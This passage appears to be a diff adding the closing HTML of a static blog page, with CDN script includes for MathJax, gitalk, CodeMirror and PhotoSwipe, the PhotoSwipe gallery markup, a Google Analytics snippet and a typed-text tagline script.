+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Think like an artist, develop like an artisan", "艺术家思维去思考问题，工匠创造精神去开发"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
